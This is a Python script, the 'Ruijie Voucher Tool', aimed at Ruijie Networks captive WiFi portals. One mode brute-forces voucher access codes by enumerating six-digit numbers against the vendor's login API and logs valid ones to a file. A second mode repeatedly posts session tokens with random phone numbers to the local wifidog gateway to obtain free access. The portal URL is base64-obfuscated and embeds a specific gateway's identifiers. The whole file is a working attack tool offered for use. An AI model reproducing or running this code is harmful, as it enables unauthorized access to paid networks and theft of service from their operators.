import os
import re
import sys
import time
import socket
import base64
import random
import string
import aiohttp
import asyncio
import argparse

# Global Constants
SUCCESS = 0
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

def clear(): 
    os.system("clear")

def Line(): 
    print(f"{y}-" * 50 + f"{w}")

def Logo():
    clear()
    print(f"{r}Ruijie Voucher Tool (Lite Version){g}\nCreated by ZD / Optimized by AI")
    Line()

def check_internet(host="8.8.8.8", port=53, timeout=3):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error:
        return False

async def get_session_id(session, session_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
    try:
        async with session.get(session_url, headers=headers) as req:
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
            return session_id
    except: 
        return None

class InternetAccess:
    def __init__(self):
        # Corrected Base64 URL (Standard Padding applied)
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: 
            self.ip = open(".ip", "r").read().strip()
        except: 
            self.ip = "192.168.99.1"

    async def execute(self):
        Logo()
        if not check_internet():
            print(f"{r}[!] No internet connection found via Socket.{w}")
        
        connector = aiohttp.TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            while True:
                sid = await get_session_id(session, self.session_url)
                if sid:
                    params = {'token': sid, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
                    try:
                        async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params) as resp:
                            print(f"{w}Time: {time.strftime('%H:%M:%S')} | Status: {g}{resp.status}{w} | ID: {sid[:8]}...")
                    except Exception as e:
                        print(f"{r}Connection Error: {e}{w}")
                await asyncio.sleep(2)

async def login_voucher(session, session_id, voucher, debug=False):
    global SUCCESS
    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    try:
        async with session.post(url, json=data) as req:
            res = await req.text()
            if 'logonUrl' in res:
                SUCCESS += 1
                print(f'{g}Success: {voucher}{w}')
                with open("success.txt", "a") as f: f.write(voucher + "\n")
            elif debug: 
                print(f'{r}Failed: {voucher}{w}')
    except: 
        pass

def digit_generator(length):
    limit = 10**length
    return [str(i).zfill(length) for i in range(limit)]

async def brute_main(mode, length, speed, tasks, debug):
    vouchers = []
    if mode == "digit": 
        vouchers = digit_generator(length)
    else:
        vouchers = ["".join(random.choice(string.ascii_letters) for _ in range(length)) for _ in range(1000)]
    
    iobj = InternetAccess()
    Logo()
    print(f"[*] Mode: {mode} | Speed: {speed} | Tasks: {tasks}")
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=speed)) as session:
        loop_cnt = 0
        current_tasks = []
        for v in vouchers:
            if loop_cnt % 50 == 0:
                sid = await get_session_id(session, iobj.session_url)
            
            if sid:
                current_tasks.append(login_voucher(session, sid, v, debug))
            
            if len(current_tasks) >= tasks:
                await asyncio.gather(*current_tasks)
                current_tasks = []
            loop_cnt += 1

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "internet"], required=True)
    parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=50)
    parser.add_argument("-t", "--tasks", type=int, default=20)
    args = parser.parse_args()

    if args.option == "code":
        asyncio.run(brute_main(args.mode, args.length, args.speed, args.tasks, True))
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())

if __name__ == "__main__":
    main()

